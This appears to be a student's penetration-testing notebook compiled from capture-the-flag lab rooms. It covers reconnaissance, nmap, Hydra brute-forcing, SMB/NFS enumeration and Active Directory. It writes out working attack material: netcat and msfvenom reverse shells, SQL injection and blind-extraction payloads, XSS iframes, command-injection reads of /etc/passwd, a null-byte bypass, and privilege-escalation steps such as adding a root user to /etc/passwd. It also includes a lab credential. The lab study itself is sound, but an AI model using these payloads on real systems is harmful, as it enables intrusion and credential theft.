
# website

if website goes down, check:
https://downforeveryoneorjustme.com/
nslookup to get ip and try to ping it - ping is in the iputils package `sudo apt update && sudo apt install -y iputils-ping`
https://shell.cloud.google.com  - shell vm
use tor to get another ip

enter bad information in the forms to see if you get error messages
don’t only try the forms, try the address bar (& burp)

look for hidden credentials in source code

check f12

check robots.txt for what the site does not want search engines to show

favicon.ico can reveal framework used - md5: https://wiki.owasp.org/index.php/OWASP_favicon_database

check sitemap.xml http://10.10.170.186/sitemap.xml

`curl http://10.10.170.186 -v` reveal server info..

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.170.186/FUZZ`


# dns

`nslookup --type=CNAME shop.website.thm`
`nslookup --type=TXT website.thm`
`nslookup --type=MX website.thm`
`nslookup --type=A www.website.thm`

```html
<div id="demo">Hi there!</div>
<button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'>Click Me!</button>
<script type="text/javascript">
document.getElementById("demo").innerHTML = "Hack the Planet";
</script>
```


# linux

remember cat, whoami, pwd,  echo

`find -name *.txt`
`find -name passwords.txt`

`wc  -l access.log` prints the number of lines

`grep "3.18.18.132" access.log` prints lines with “” in them

`ssh tryhackme@10.10.80.242`

`&` This operator allows you to run commands in the background of your terminal.
`&&` This operator allows you to combine multiple commands together in one line of your terminal.
`>` This operator is a redirector - meaning that we can take the output from a command (such as
 using cat to output a file) and direct it elsewhere.
`>>` This operator does the same function of the > operator but appends the output rather than
 replacing (meaning nothing is overwritten).

`touch`	touch	Create file
`mkdir`	make directory	Create a folder
`cp`	copy	Copy a file or folder
`mv`	move	Move a file or folder
`rm`	remove	Remove a file or folder
`file`	file	Determine the type of a file

`rm -R`  for dir

`/etc`	has shadow passwd sudoers sudoers.d
	passwords encrypted in sha512
`/tmp`	everybody access bt default, good place to store stuff like scripts
	emptied at restart
`/var/log`	log files

Attackbox
1. Tools are located in /root/Desktop/Tools & /opt/
2. Webshells are located in /usr/share/webshells
3. Wordlists are located in /usr/share/wordlists


# editors

vim cheat sheet


# file transfer

`wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt`

### using ssh to copy files
`scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`
copies file to remote system with new name
`scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`
copy file to local machine

python has web server, start with
`python3 -m http.server`
using current dir as root

alt is https://github.com/sc0tfree/updog web server


# processes

`ps aux`
`top`
`kill 123`
Below are some of the signals that we can send to a process when it is killed:
- SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand
- SIGKILL - Kill the process - doesn't do any cleanup after the fact
- SIGSTOP - Stop/suspend a process
`systemctl [option] [service]`
four options: Start, Stop, Enable, Disable
`systemctl start apache2`

hidden process&
`ctrl+z` hides already running process
`fg` command shows it again

# cron

in crontab file

| Value | Description                              |
| ----- | ---------------------------------------- |
| MIN   | What minute to execute at                |
| HOUR  | What hour to execute at                  |
| DOM   | What day of the month to execute at      |
| MON   | What month of the year to execute at     |
| DOW   | What day of the week to execute at       |
| CMD   | The actual command that will be executed |

Let's use the example of backing up files. You may wish to backup "cmnatic"'s  "Documents" every 12 hours. We would use the following formatting:

`0 *12 * * * cp -R /home/cmnatic/Documents /var/backups/`
`@reboot  /var/opt/processes.sh`

`crontab -e`   to edit crontab


# windows

command list: https://ss64.com/nt/

%windir%

lusrmgr.msc
MSConfig - boot options
taskmgr

compmgmt

at cmd:
whoami
hostname
netstat
net

control /name Microsoft.WindowsUpdate


# exploits

CVE (Common Vulnerabilities and Exposures)

ExploitDB https://www.exploit-db.com
NVD https://nvd.nist.gov/vuln/search
CVE Mitre https://cve.mitre.org

kali has searchsploit that searches exploitdb
exploitdb has downloadable exploits ready for use


# networking

ping -i interval
traceroute
whois
dig

## nmap

-sS	SYN Scan
-sU	UDP scan
-O	detect operating system
-sV	detect the version of the services running
-v	Increase verbosity level (use -vv or more for greater effect)
-vv	very verbose (always use)

Save output:
-oA	save in three major formats
-oN	save in a "normal" format
-oG	save in a "grepable" format

If we don't care about how loud we are, we can enable "aggressive" mode. This is a shorthand switch that activates service detection, operating system detection, a traceroute and common script scanning.

-A	How would you activate this setting?
-T5	Level 5 "timing" template. These are essentially used to increase the speed your scan runs at.
 Be careful though: higher speeds are noisier, and can incur errors!
-p 80	only scan port 80
-p1000-1500	scan ports 1000-1500
-p-	scan all ports
--script	  activate a script from the nmap scripting library
--script=vuln	activate all of the scripts in the "vuln" category

When port scanning with Nmap, there are three basic scan types. These are:
- TCP Connect Scans (-sT)
- SYN "Half-open" Scans (-sS)
- UDP Scans (-sU)
Additionally there are several less common port scan types, some of which we will also cover (albeit in less detail). These are:
- TCP Null Scans (-sN)
- TCP FIN Scans (-sF)
- TCP Xmas Scans (-sX)
Most of these (with the exception of UDP scans) are used for very similar purposes, however, the way that they work differs between each scan. This means that, whilst one of the first three scans are likely to be your go-to in most situations, it's worth bearing in mind that other scan types exist.

In terms of network scanning, we will also look briefly at ICMP (or "ping") scanning.

make firewall send RST on TCP SYN request
`iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset`


TCP Connect scans (-sT), TCP three-way handshake
SYN scans (-sS) refered to as "Half-open" scans, or "Stealth" scans.

-sU	nmap udp scan, slower than tcp
port is marked open|filtered if no reply, since udp is connectionless
port is marked open if there is actually a reply
port is marked closed if a icmp packet is received
`nmap -sU --top-ports 30 <target>`  ex of limited scan (since slow)

### Nmap Scripting Engine (NSE) 

Windows does not reply to ping, ICMP
to avoid thinking all machines are off use option:
-Pn	don’t ping before scan
this means all ports will be checked even if there is no machine there = takes time

Avoid firewalls:
- `-f`:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
- An alternative to -f, but providing more control over the size of the packets: `--mtu <number>`, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
- `--scan-delay <time>ms`:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
- `--badsum`:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

`ping 10.10.81.46`
ping will not work if icmp is off/blocked

Christmas scan of the first 999 ports (UDP)
`nmap -sX -p 1-999 10.10.81.46 -vv`

TCP SYN scan of the first 5000 ports:
`nmap -sS -p 1-5000 10.10.81.46 -vv`

checking if anonymous ftp is allowed:
`nmap -script=ftp-anon -p 21 10.10.81.46 -vv`

list script:
`cat /usr/share/nmap/scripts/smb-os-discovery.nse`

list scripts:
`cat /usr/share/nmap/scripts/script.db`


update scripts/install missing:



update script db:
`sudo nmap --script-updatedb`

get help on a script:
`nmap --script-help ftp-anon.nse`
`nmap --script-help *vuln*`

# SMB

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 

The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"
TAG        	FUNCTION
-U         	get userlist
-M         	get machine list
-N         	get namelist dump (different from -U and-M)
-S         	get sharelist
-P         	get password policy information
-G         	get group and member list
-a         	all of the above (full basic enumeration)

enum smb data:
enum4linux -a 10.10.97.172


We can remotely access the SMB share using the syntax:
`smbclient //[IP]/[SHARE]`
Followed by the tags:
`-U [name]` : to specify the user
`-p [port]` : to specify the port

administrator, guest, krbtgt, domain admins, root, bin, none


ssh with rsa id file:
`ssh -i id_rsa cactus@10.10.97.172`



# Enumerating Telnet


![[Images/image30.png]]

![[Images/image20.png]]

![[Images/image16.png]]


# Exploiting Telnet

sudo tcpdump ip proto \\icmp -i tun0

`ping [local THM ip] -c 1"` through the telnet session
![[Images/image44.png]]

![[Images/image39.png]]

We're going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here's our syntax:
`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

`msfvenom -p cmd/unix/reverse_netcat lhost=10.18.0.154 lport=4444 R`

![[Images/image25.png]]

sending that to the telnet by .RUN
![[Images/image28.png]]

wohoo, got my first reverse shell
![[Images/image55.png]]

# FTP

A typical FTP session operates using two channels:
- a command (sometimes called the control) channel
- a data channel.
The FTP server may support either Active or Passive connections, or both. 
- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 


# Enumerating FTP

![[Images/image5.png]]

-sS only found the ftp port, not the http one! But even the simple -sT found port 80 too!

With -A aggressive I got:
![[Images/image15.png]]

![[Images/image58.png]]

![[Images/image48.png]]

# Exploiting FTP

### Hydra

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the [GitHub](https://www.google.com/url?q=https://github.com/vanhauser-thc/thc-hydra&sa=D&source=editors&ust=1722893058949991&usg=AOvVaw1NnPSQUhNMcba4UNa6fKeH) here.


The syntax for the command we're going to use to find the passwords is this:
"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"
Let's break it down:
SECTION         	FUNCTION

hydra               	Runs the hydra tool

-t 4                	Number of parallel connections per target

-l [user]        	   Points to the user who's account you're trying to compromise

-P [path to dictionary] Points to the file containing the list of possible passwords

-vV                 	Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP]        	The IP address of the target machine

ftp / protocol      	Sets the protocol

hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.120.115 ftp

![[Images/image33.png]]
lol

ftp
![[Images/image73.png]]
![[Images/image65.png]]
![[Images/image62.png]]
![[Images/image51.png]]
![[Images/image34.png]]
![[Images/image37.png]]
![[Images/image35.png]]
hmm


# NFS

NFS-Common
It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with "showmount" and "mount.nfs"

use /usr/sbin/showmount -e [IP] to list the NFS shares

sudo mount -t nfs IP:share /tmp/mount/ -nolock

Path:
    NFS Access ->
        Gain Low Privilege Shell ->
            Upload Bash Executable to the NFS share ->
                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
            	    Login through SSH ->
                	    Execute SUID Bit Bash Executable ->
                    	    ROOT ACCESS

# Enumerating NFS

![[Images/image6.png]]
![[Images/image24.png]]
![[Images/image1.png]]
PORT  	STATE SERVICE  REASON  VERSION
22/tcp	open  ssh  	syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEQIafB/d+8xhCVa/WJUjV/xtzU7h9fmdPMEVWEobVN59eusBnBD19rp08xrjFOkvHdLSe3XCaDSSreOd4m9If73vzGT/dpXO4kj2Je+p2ALDLLr0vbA+/EVrFJjsbKJ6OLNWGw2nD6romEld++MLOI0SbY9zaM3ov4hwQZ2Fnp9QF5OAt3zqIyxk5Xr99gpm/i4mk3YtA+3I1WHpdLE5Uw41aOVYapowLh+sG1Uyi8dxnI7WJ04DywrUftJam/ajlY6QAiWDR96QRw7RuNJ+8dOLDj7JT+aNREvSTrSWahn+clpIwCgDuVUYy36BEfyTpC/JyTtuS077Bj8vv8NLl
|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIL2RAJwSBEjlVNFa6km4BnXrbfxBqanFGsc8V7KPraGwGaJkBCtaUpVRQmPXQHhNePswl4UI2rsxVLcw/DYQ4s=
|   256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqYlGyJzySWsOMejWbc9mf3mFzerVbrty8i6PCOR7lv
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version	port/proto  service
|   100227  3       	2049/tcp   nfs_acl
|   100227  3       	2049/tcp6  nfs_acl
|   100227  3       	2049/udp   nfs_acl
|_  100227  3       	2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
38989/tcp open  mountd   syn-ack 1-3 (RPC #100005)
40205/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
40841/tcp open  mountd   syn-ack 1-3 (RPC #100005)
52885/tcp open  mountd   syn-ack 1-3 (RPC #100005)

![[Images/image38.png]]
![[Images/image42.png]]
![[Images/image63.png]]
![[Images/image69.png]]
![[Images/image3.png]]
![[Images/image18.png]]
![[Images/image41.png]]
![[Images/image43.png]]
![[Images/image31.png]]
![[Images/image67.png]]

# Exploiting NFS

wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
![[Images/image12.png]]

![[Images/image59.png]]
![[Images/image64.png]]
![[Images/image72.png]]
![[Images/image29.png]]

![[Images/image53.png]]
![[Images/image45.png]]
![[Images/image56.png]]

![[Images/image17.png]]
![[Images/image23.png]]
![[Images/image71.png]]


# Understanding SMTP

sudo apt install seclists

hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.223.172 ssh

![[Images/image66.png]]
![[Images/image11.png]]
![[Images/image2.png]]
![[Images/image61.png]]
![[Images/image32.png]]

![[Images/image10.png]]
![[Images/image7.png]]

![[Images/image50.png]]
![[Images/image27.png]]

# Metasploit

![[Images/image68.png]]
![[Images/image57.png]]
![[Images/image19.png]]
![[Images/image21.png]]
![[Images/image49.png]]
![[Images/image8.png]]
![[Images/image46.png]]
![[Images/image36.png]]
![[Images/image70.png]]


# MySQL

sudo apt install default-mysql-client
mysql -h [IP] -u [username] -p

![[Images/image4.png]]
![[Images/image22.png]]

![[Images/image13.png]]
![[Images/image60.png]]
![[Images/image54.png]]
![[Images/image52.png]]
carl:*EA031893AA21444B170FC2162A56978B8CEECE18
![[Images/image47.png]]
![[Images/image14.png]]


# Webapp tips

 $(cat /etc/passwd)
 $(cat /etc/os-release)
 $(ls -la)

Navigate to http://10.10.68.69:86/console to access the Werkzeug console.


SQLi = SQL injection

check for sqli possibilities:
https://website.thm/article?id=1’
You should get an error message

union check:
Try UNION, add 1, 2, 3, 4, 5 on at a time until the number of columns match
https://website.thm/article?id=1 UNION SELECT 1, 2, 3
The error message will disappear when you have the right no of cols but you still get the hit on id=1 so switch to id=0

inject sql:
then replace the last col nr with what you want to run:
https://website.thm/article?id=0 UNION SELECT 35, 5, database()
output:
5
Article ID: 35
sqli_one

by setting the id to an illegal number we make sure that our query’s reply is the only correct one and the one that is shown.

get tables:
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
group_concat() = makes string from table?
information_schema database every user has access to, information about all the databases and tables the user has access to
here we’re asking about tables in the sqli_one database

get columns:
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

We get id, username, password


(other uglier way to do this from burp room:
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people")

get data:
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

We get:
`admin:p4ssword`
`martin:pa$$word`
`jim:work123`

Blind SQLi = no error info or such

SQL for login
select * from users where username='%username%' and password='%password%' LIMIT 1;

enter into password field: ' OR 1=1;--
makes the query
select * from users where username='' and password='' OR 1=1;
which is always true = bypassing login

Blind Boolean

https://website.thm/checkuser?username=admin
true
https://website.thm/checkuser?username=admin123
false

sql in the bg is: select * from users where username = '%username%' LIMIT 1;
just checking if the user exists

find the number of cols:
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2;--
admin123' UNION SELECT 1,2,3;--      <- here we got a true again = 3 columns

find the db name:
admin123' UNION SELECT 1,2,3 where database() like '%';--
true as % is a wildcard matching everything

admin123' UNION SELECT 1,2,3 where database() like 'a%';--
admin123' UNION SELECT 1,2,3 where database() like 'b%';--
…
admin123' UNION SELECT 1,2,3 where database() like 's%';--   ← True again! The first letter is s


admin123' UNION SELECT 1,2,3 where database() like 'sa%';--
admin123' UNION SELECT 1,2,3 where database() like 'sb%';--
…
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
until
admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--

look for tables in the database:
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
b
… (I tried e for employees and then u for users lol, nice with easy names)
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users';--

look for column names:
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
b
---
found
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'username';--                   ← True!
password

exclude stuff like this:
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

find the username:
admin123' UNION SELECT 1,2,3 from users where username like 'a%

admin123' UNION SELECT 1,2,3 from users where username like 'admin';--  ← True!

look for the password:
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

password is 3845


Blind time based SQLi

Uses sleep to see true/false

https://website.thm/analytics?referrer=tryhackme.com

admin123' UNION SELECT SLEEP(5);--               ← No delay
admin123' UNION SELECT SLEEP(5),2;--            ← Delay!! Table has two columns

admin123' UNION SELECT SLEEP(2),2 WHERE database() like 'sqli_four';--    ← database name = sqli_four

admin123' UNION SELECT SLEEP(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';--                                                        ← table name = users

https://website.thm/checkuser?username=admin123' UNION SELECT SLEEP(2),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'username';--                                                 ← column name = username
password is there too

admin123' UNION SELECT SLEEP(2),2 from users where username like 'admin';--    ←yup

admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like 'a%

admin123' UNION SELECT SLEEP(2),2 from users where username='admin' and password like '4961';--

found it

----------------

SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 1'

GET /about/0 UNION SELECT 1,2,3,4,group_concat(column_name) FROM information_schema.columns WHERE table_name='people';-- HTTP/1.1

id,firstName,lastName,pfpLink,role,shortRole,bio,notes

GET /about/0 UNION SELECT 1,2,3,4,notes FROM people;-- HTTP/1.1

got our notes :)


poisoned 0 byte
We will now go back to the  http://10.10.121.223/ftp/ folder and try to download package.json.bak. But it seems we are met with a 403 which says that only .md and .pdf files can be downloaded. 

![[Images/image9.png]]

To get around this, we will use a character bypass called "Poison Null Byte". A Poison Null Byte looks like this: %00. 
Note: as we can download it using the url, we will need to encode this into a url encoded format.
The Poison Null Byte will now look like this: %2500. Adding this and then a .md to the end will bypass the 403 error!

![[Images/image26.png]]

Why does this work? 
A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string. 

xss - running javascript

DOM (Special, HTML) XSS
`<iframe src="javascript:alert(`xss`)">`
pasting this into a search field

Persistent (Server-side) XSS
`10.10.54.43/#/track-result?id=<iframe src="javascript:alert(`xss`)">`
putting it after id= and such

Reflected (Client-side) XSS
adding it to data sent to the web page intercepting with burp proxy, the example was when logging out, catching the request to save the ip and  adding a field called True-Client-IP with the value `<iframe src="javascript:alert(`xss`)">`
first go to the new url, then refresh the page


Shells & Reverse shells

netcat, can receive rev shells
socat, better netcat

Reverse shell ex:
On the attacking machine: sudo nc -lvnp 443
On the target: `nc <LOCAL-IP> <PORT> -e /bin/bash`

Bind shell ex:
On the target: `nc -lvnp <port> -e "cmd.exe"`
On the attacking machine: `nc MACHINE_IP <port>`

thm alias listener =
sudo rlwrap nc -lvnp 443

Stabilizing the shell

python -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
export TERM=xterm adds term commands such as clear
background the shell using Ctrl + Z
in our own terminal use stty raw -echo; fg turns off echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes) & foregrounds the shell
to get echo back after type reset & press enter

Better shell

1. Finding out more about our own shell

echo $TERM
save response

stty -a				(apt install core-utils if no stty)
gives rows and columns of current shell and more

2. Hop back to reverse shell

stty raw echo; fg
adds use of arrow keys.. to remote shell; go back to remote shell

term will look funny and type last command…

reset
it will ask for terminal type?
answer with what your $TERM  was
if error try for example xterm

stty rows nn columns nn
where nn is your saved information
this will make apps like nano work







Make ssh key

get /home/user/.ssh/id_rsa and ssh in to the machine. (chmod 600 id_rsa) and connect by executing ssh -i id_rsa user@ip).
If there’s no key, generate one with ssh-keygen.










Gobuster

-t 64	64 threads to speed up
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-k can be used to skip bad cert warning

-x.html,.css,.js
-x js,conf,htm,config,html,php,css,map,txt

check subdomains, might have bugs main does not
ex. mobile.

gobuster dns -d mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt


gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt


good wordlists for this purpose:
	/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
	/usr/share/wordlists/dirbuster/directory-list-1.0.txt
	/usr/share/wordlists/dirb/big.txt
	/usr/share/wordlists/dirb/common.txt
	/usr/share/wordlists/dirb/small.txt
	/usr/share/wordlists/dirb/extensions_common.txt - Useful for when fuzzing for files!


wpscan

wpscan --url http://cmnatics.playground/ --enumerate t
wpscan --url http://cmnatics.playground/ --enumerate p
wpscan --url http://cmnatics.playground/ --enumerate u

wpscan --url http://cmnatics.playground/ --enumerate vp
required vuln db to be set up, how?

wpscan --url http://wpscan.thm/ --passwords /usr/share//wordlists/rockyou.txt --usernames phreakazoid

--plugins-detection aggressive
--plugins-detection passive

nikto

nikto -h 10.10.186.192:80

scan several hosts on network
nmap -p80 172.16.0.0/24 -oG - | nikto -h -

scan several ports on one host
nikto -h 10.10.10.1 -p 80,8000,8080

using plugins
nikto --list-plugins
nikto -h 10.10.186.192:80 -Plugin dir_traversal



Privesc Linux

LinEnum.sh
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
python3 -m http.server 8000
wget 10.10.11.214:8000/LinEnum.sh
shows kernel info, there’s often a kernel exploit for this
lists SUID (Set owner User ID up on execution) permissions
lists cron jobs

Find SUID & GUID binaries
find / -perm -u=s -type f 2>/dev/null
sudo find / -type f \( -perm -4000 -o -perm -2000 \) -print  (works too???)

passwd perms?
are any users members of the root group, listing group 0 in passwd?
test:x:0:0:root:/root:/bin/bash
is so we can add user with root perms by:
adding password:
openssl passwd -1 -salt [salt] [password]
then use the result in a new line in /etc/passwd
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

sudo -l
always run sudo -l to list what the current user can run as root
ex. vi use command :!sh to get a shell as root
if chmod perm just update perms on bash
if nmap run “sudo nmap --interactive” and type “!sh” to get root shell

cat /etc/crontab




AD

shadow creds,  logging in with cert + priv key

sync time with ad!
  ntpdate to sync date

ldap_shell -dc-ip 10.10.11.181 -dc-host dc.absolute.htb  absolute.htb/m.lovegod:’AbsoluteLDAP2022!’

kinit -h
kinit m.lovegod@absolute.htb
sudo nano /etc/krb5.conf
  add in all caps
  add domain

kinit M.LOVEGOD@ABSOLUTE.HTB
gets kerb ticket

export KRB5CCNAME=/tmp/krb5cc_1000

ldap_shell -dc-ip 10.10.11.181 -dc-host dc.absolute.htb -k -no-pass absolute.htb/m.lovegod
  gets shell
  tool to get shell, alt is impacket-get-TGT

# add_user_to_group

certipy shadow auto-u  ‘’m.lovegod@
![[Images/image40.png]]








Website  -  /index.php?page=home.html









enumeration

uname -a

check ~/.bash_history for different users

.bash_profile and .bashrc are files containing shell commands that are run when Bash is invoked

check sudo -v, find cve. versions < 1.8.28 are vulnerable to CVE-2019-14287





useful files linux

/etc/issue	contains a message or system identification to be printed before the login prompt.
/etc/profile	controls system-wide default variables, such as Export variables, File creation 
	mask (umask), Terminal types, Mail messages to indicate when new mail has 
	arrived
/proc/version	specifies the version of the Linux kernel
/etc/passwd	has all registered user that has access to a system
/etc/shadow	contains information about the system's users' passwords
/root/.bash_history	contains the history commands for root user
/var/log/dmessage	contains global system messages, including the messages that are logged 
	during system startup
/var/mail/root	all emails for root user
/root/.ssh/id_rsa	Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log	the accessed requests for Apache  webserver
/etc/os-release

C:\boot.ini	contains the boot options for computers with BIOS firmware
windows\win.ini



Windows

another trick is with programs is in the taskbar. Sometimes they are running with admin rights, then you open the help of the program then you can open an explorer.exe windows then launch cmd.exe with admin rights

C:\Users\Jacob\AppData\Local\Microsoft\Teams\Update.exe
